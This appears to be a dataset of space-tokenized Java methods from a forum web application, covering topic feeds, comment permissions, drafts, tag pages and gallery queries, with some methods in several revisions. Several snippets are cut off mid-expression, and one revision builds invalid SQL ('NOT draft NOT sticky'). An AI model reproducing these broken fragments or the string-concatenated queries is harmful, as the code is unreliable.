public List < Topic > getAllTopicsFeed ( Section section , Date fromDate ) { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getAllTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; fromDate= " ) . append ( fromDate ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; topicListDto . setCommitMode ( TopicListDao . CommitMode . UNCOMMITED_ONLY ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; } topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; topicListDto . setFromDate ( fromDate ) ; return topicListDao . getTopics ( topicListDto ) ; } 
public boolean isCommentsAllowed ( Group group , Topic topic , User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( topic . isDeleted ( ) | | topic . isExpired ( ) ) { return false ; } int score = getPostscore ( group , topic ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = topic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
public boolean isCommentsEditingAllowed ( @Nonnull Comment comment , @Nonnull Topic topic , @Nullable User currentUser ) { Preconditions . checkNotNull ( comment ) ; Preconditions . checkNotNull ( topic ) ; final boolean haveAnswers = commentService . isHaveAnswers ( comment ) ; return isCommentEditableNow ( comment , 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) throws Exception { Topic topic = topicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( topic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { throw new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( group , topic , AuthUtil . getCurrentUser ( ) , false ) ; CommentList comments = commentService . getCommentList ( topic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getProfile ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , topic ) ; return ImmutableMap . of ( " comments " , preparedComments , 
public boolean isDraftMode ( ) { return draft ! = null ; } 
public int saveNewMessage ( final Topic msg , final User user , String text , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; insert message text jdbcTemplate.update( "INSERT INTO msgbase (id, message, bbcode) values (?,?, ?)", msgid, text, true ); return msgid; } 
public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public int saveNewMessage ( final Topic msg , final User user , String text , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?) " , new PreparedStatementCallback < String > ( ) { @Override public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } } ) ; insert message text jdbcTemplate.update( "INSERT INTO msgbase (id, message) values (?,?)", msgid, text ); return msgid; } 
public boolean isShowDraft ( ) { return showDraft ; } 
public ModelAndView mainPage ( HttpServletRequest request , HttpServletResponse response ) { Template tmpl = Template . getTemplate ( request ) ; response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) ; response . setDateHeader ( " Last-Modified " , System . currentTimeMillis ( ) - 2 * 1000 ) ; List < Topic > messages = topicListService . getMainPageFeed ( tmpl . getProf ( ) . isShowGalleryOnMain ( ) ) ; ModelAndView mv = new ModelAndView ( " index " ) ; Profile profile = tmpl . getProf ( ) ; mv . getModel ( ) . put ( " news " , prepareService . prepareMessagesForUser ( profile . isMiniNewsBoxletOnMainPage ( ) ? filterMiniNews ( messages ) : messages , request . isSecure ( ) , tmpl . getCurrentUser ( ) , profile , false ) ) ; if ( tmpl . isSessionAuthorized ( ) ) { mv . getModel ( ) . put ( " hasDrafts " , topicDao . hasDrafts ( tmpl . getCurrentUser ( ) ) ) ; } if ( tmpl . isModeratorSession ( ) | | tmpl . isCorrectorSession ( ) ) { int uncommited = topicDao . getUncommitedCount ( ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = topicDao . getUncommitedCount ( Section . SECTION_NEWS ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! tmpl . isSessionAuthorized ( ) | | ! tmpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public boolean hasDrafts ( User author ) { List < Integer > res = jdbcTemplate . queryForList ( " select id FROM topics WHERE draft AND userid=? LIMIT 1 " , Integer . class , author . getId ( ) ) ; return ! res . isEmpty ( ) ; } 
public void publish ( Topic msg ) { jdbcTemplate . update ( " UPDATE topics SET draft='f',postdate='now' WHERE id=? AND draft " , 
public boolean isCommentsAllowed ( Group group , Topic topic , User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( topic . isDeleted ( ) | | topic . isExpired ( ) | | topic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , topic ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return true ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return true ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return true ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = topic . getUid ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return true ; 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Topic message = messageDao . getById ( msgid ) ; Template tmpl = Template . getTemplate ( request ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; topicPermissionService . checkView ( group , message , tmpl . getCurrentUser ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
private Optional < Comment > findNextComment ( final Comment comment ) throws MessageNotFoundException { Topic updatedTopic = messageDao . getById ( comment . getTopicId ( ) ) ; CommentList commentList = commentService . getCommentList ( updatedTopic , false ) ; return Iterables . tryFind ( commentList . getList ( ) , 
public boolean apply ( Comment input ) { return input . getId ( ) > = comment . getId ( ) ; } 
private List < TopicsListItem > getStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY postdate DESC " ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( q , group . getId ( ) ) ; return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int topics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + topics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int topics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT draft NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + topics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int topics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.stat4, topics.sticky, topics.resolved " + " FROM topics WHERE NOT draft AND NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + topics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + topics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , SolrServerException , MessageNotFoundException { Topic msg = topicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
public ModelAndView moveTopicFormForum ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic topic = messageDao . getById ( msgid ) ; Section section = sectionService . getSection ( Section . SECTION_FORUM ) ; mv . getModel ( ) . put ( " message " , topic ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; mv . getModel ( ) . put ( " author " , userDao . getUserCached ( topic . getUid ( ) ) ) ; return mv ; } 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Topic topic = messageDao . getById ( msgid ) ; Section section = sectionService . getSection ( topic . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , topic ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; mv . getModel ( ) . put ( " author " , userDao . getUserCached ( topic . getUid ( ) ) ) ; return mv ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Forbidden " ) ; } tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > topics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , 1 ) ; List < PersonalizedPreparedTopic > preparedTopics = prepareService . prepareMessagesForUser ( topics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; mv . addObject ( " fullNews " , preparedTopics ) ; return mv ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month , int count ) throws UserErrorException , TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( topicListDto ) ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Forbidden " ) ; } tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , 21 ) ; List < Topic > fullNewsTopics = newsTopics . isEmpty ( ) ? ImmutableList . < Topic > of ( ) : newsTopics . subList ( 0 , 1 ) ; List < Topic > briefNewsTopics = newsTopics . size ( ) < = 1 ? ImmutableList . < Topic > of ( ) : newsTopics . subList ( 1 , newsTopics . size ( ) ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; mv . addObject ( " fullNews " , fullNews ) ; mv . addObject ( " briefNews " , briefNewsTopics ) ; return mv ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Forbidden " ) ; } tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , 21 ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = tailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; mv . addObject ( " fullNews " , fullNews ) ; mv . addObject ( " briefNews1 " , firstHalf ( briefNewsTopics ) ) ; mv . addObject ( " briefNews2 " , secondHalf ( briefNewsTopics ) ) ; return mv ; } 
public static < T > List < T > headOrEmpty ( List < T > list ) { return list . isEmpty ( ) ? ImmutableList . < T > of ( ) : list . subList ( 0 , 1 ) ; } 
public static < T > List < T > tailOrEmpty ( List < T > list ) { return list . size ( ) < = 1 ? ImmutableList . < T > of ( ) : list . subList ( 1 , list . size ( ) ) ; } 
public static < T > List < T > firstHalf ( List < T > list ) { int split = list . size ( ) / 2 + ( list . size ( ) % 2 ) ; return list . subList ( 0 , split ) ; } 
public static < T > List < T > secondHalf ( List < T > list ) { int split = list . size ( ) / 2 + ( list . size ( ) % 2 ) ; return list . subList ( split , list . size ( ) ) ; } 
public void halfsEven ( ) { List < String > data = ImmutableList . of ( " 1 " , " 2 " , " 3 " , " 4 " ) ; assertEquals ( ImmutableList . of ( " 1 " , " 2 " ) , firstHalf ( data ) ) ; assertEquals ( ImmutableList . of ( " 3 " , " 4 " ) , secondHalf ( data ) ) ; } 
public void halfsOdd ( ) { List < String > data = ImmutableList . of ( " 1 " , " 2 " , " 3 " ) ; assertEquals ( ImmutableList . of ( " 1 " , " 2 " ) , firstHalf ( data ) ) ; assertEquals ( ImmutableList . of ( " 3 " ) , secondHalf ( data ) ) ; } 
public void halfsEmpty ( ) { List < String > data = ImmutableList . of ( ) ; assertEquals ( ImmutableList . < String > of ( ) , firstHalf ( data ) ) ; assertEquals ( ImmutableList . < String > of ( ) , secondHalf ( data ) ) ; } 
public List < GalleryItem > getGalleryItems ( int countItems , String tag ) throws TagNotFoundException { final Section gallery = sectionService . getSection ( Section . SECTION_GALLERY ) ; int tagId = tagService . getTagId ( tag ) ; String sql = " SELECT t.msgid, t.stat1,t.title, t.userid, t.urlname, images.icon, images.original, images.id AS imageid " + " FROM (SELECT topics.id AS msgid, topics.stat1, topics.title, userid, urlname " + " FROM topics JOIN groups ON topics.groupid = groups.id WHERE topics.moderate AND section= " + Section . SECTION_GALLERY + " " + " AND NOT topics.deleted AND commitdate IS NOT NULL AND topics.id IN (SELECT msgid FROM tags WHERE tagid=?) ORDER BY commitdate DESC LIMIT ?) " + " as t JOIN images ON t.msgid = images.topic " ; return jdbcTemplate . query ( sql , new GalleryItemRowMapper ( gallery ) , tagId , countItems ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
public ModelAndView tagPage ( HttpServletRequest request , @PathVariable String tag ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Forbidden " ) ; } tagService . checkTag ( tag ) ; ModelAndView mv = new ModelAndView ( " tag-page " ) ; mv . addObject ( " tag " , tag ) ; mv . addAllObjects ( getNewsSection ( request , tag ) ) ; mv . addAllObjects ( getGallerySection ( tag ) ) ; return mv ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String tag ) throws TagNotFoundException { Template tmpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = topicListService . getTopicsFeed ( newsSection , null , tag , 0 , null , null , 21 ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = tailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , tmpl . getCurrentUser ( ) , tmpl . getProf ( ) , false ) ; return ImmutableMap . < String , Object > of ( " fullNews " , fullNews , 
private Map < String , Object > getGallerySection ( String tag ) throws TagNotFoundException { List < PreparedGalleryItem > list = imageDao . prepare ( imageDao . getGalleryItems ( 3 , tag ) ) ; return ImmutableMap . < String , Object > of ( " gallery " , list 
public int getTagId ( String tag ) throws TagNotFoundException { return tagDao . getTagId ( tag , true ) ; } 
public List < Topic > getTopicsFeed ( Section section , Group group , String tag , Integer offset , Integer year , Integer month , int count ) throws TagNotFoundException { logger . debug ( new StringBuilder ( ) . append ( " TopicListService.getTopicsFeed() " ) . append ( " ; section= " ) . append ( ( section ! = null ) ? section . toString ( ) : " (null) " ) . append ( " ; group= " ) . append ( ( group ! = null ) ? group . toString ( ) : " (null) " ) . append ( " ; tag= " ) . append ( tag ) . append ( " ; offset= " ) . append ( offset ) . append ( " ; year= " ) . append ( year ) . append ( " ; month= " ) . append ( month ) . toString ( ) ) ; TopicListDto topicListDto = new TopicListDto ( ) ; if ( section ! = null ) { topicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { topicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { topicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { topicListDto . setGroup ( group . getId ( ) ) ; } if ( tag ! = null ) { topicListDto . setTag ( tagService . getTagId ( tag ) ) ; } if ( month ! = null & & year ! = null ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year , month - 1 , 1 , 0 , 0 , 0 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; topicListDto . setToDate ( calendar . getTime ( ) ) ; } else { topicListDto . setLimit ( count ) ; topicListDto . setOffset ( offset > 0 ? offset : null ) ; if ( tag = = null & & group = = null & & ! section . isPremoderated ( ) ) { topicListDto . setDateLimitType ( TopicListDto . DateLimitType . MONTH_AGO ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; topicListDto . setFromDate ( calendar . getTime ( ) ) ; } } return getCachedFeed ( topicListDto ) ; } 
public List < GalleryItem > getGalleryItems ( int countItems , String tag ) throws TagNotFoundException { final Section gallery = sectionService . getSection ( Section . SECTION_GALLERY ) ; int tagId = tagService . getTagId ( tag ) ; String sql = " SELECT t.msgid, t.stat1,t.title, t.userid, t.urlname, images.icon, images.original, images.id AS imageid, t.commitdate " + " FROM (SELECT topics.id AS msgid, topics.stat1, topics.title, userid, urlname, topics.commitdate " + " FROM topics JOIN groups ON topics.groupid = groups.id WHERE topics.moderate AND section= " + Section . SECTION_GALLERY + " " + " AND NOT topics.deleted AND commitdate IS NOT NULL AND topics.id IN (SELECT msgid FROM tags WHERE tagid=?) ORDER BY commitdate DESC LIMIT ?) " + " as t JOIN images ON t.msgid = images.topic " ; return jdbcTemplate . query ( sql , new GalleryItemRowMapper ( gallery ) , tagId , countItems ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setCommitDate ( rs . getTimestamp ( " commitdate " ) ) ; Image image = new Image ( rs . getInt ( " imageid " ) , rs . getInt ( " msgid " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; item . setImage ( image ) ; item . setUserid ( rs . getInt ( " userid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( gallery . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; return item ; } 
